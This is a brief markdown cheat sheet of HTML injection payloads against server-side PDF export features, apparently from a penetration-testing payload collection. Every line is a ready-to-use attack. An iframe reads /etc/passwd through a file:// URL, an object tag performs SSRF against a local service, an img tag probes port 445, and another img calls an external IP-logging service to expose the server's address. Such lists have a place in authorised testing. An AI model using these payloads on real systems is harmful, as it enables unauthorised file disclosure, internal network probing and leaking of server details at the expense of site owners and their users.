# PDF Export Attacks

```html
<!-- LFI via PDF export -->
<iframe src="file:///etc/passwd" height=1000 width=800>

<!-- SSRF via PDF export -->
<object data="http://127.0.0.1:8443"/>

<!-- Port scanning -->
<img src="http://127.0.0.1:445"/>

<!-- IP disclosure -->
<img src="https://iplogger.com/yourcode.gif"/>
```